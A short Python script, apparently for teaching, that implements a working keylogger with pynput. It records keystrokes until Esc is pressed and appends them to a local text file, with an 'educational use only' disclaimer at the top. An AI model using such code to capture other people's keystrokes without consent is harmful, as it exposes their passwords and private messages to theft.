#This keylogger was developed for purely EDUCATIONAL use. 
#Do not use it for any other purpose.

from pynput import keyboard

#string variable where all recorded key presses go
log = ''

#variable for the output file 
Output_File = "KeyloggerOutput.txt"

#records all the keystrokes
def Keylogger(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == keyboard.Key.esc:
            #adds a new line and puts a seperating line on the new line
            #Then stops the listener
            log = log + str('\n')
            log = log + str('-----------------------')
            return False
        elif key == keyboard.Key.space:
            #adds a space whenever Space is pressed
            log = log + str(' ')
        elif key == keyboard.Key.enter:
            #creates a new line whenever enter is pressed
            log = log + str('\n')
        elif key == keyboard.Key.backspace:
            #removes the character in log when backspace is pressed
            log = log[:-1]
        else:
            #if any other special character (Arrow keys, Tab, etc) is pressed it will do nothing
            log = log + ""

#creates and records all the log data to the file
def create_file():
    global log, Output_File
    #Opens file
    file = open(Output_File, "a")
    #Writes the log data into Output_File
    file.write(log)
    #Closes the file
    file.close()

#Main process
with keyboard.Listener(on_press=Keylogger) as listener:
    listener.join()
    #Runs after Esc is pressed
    create_file()
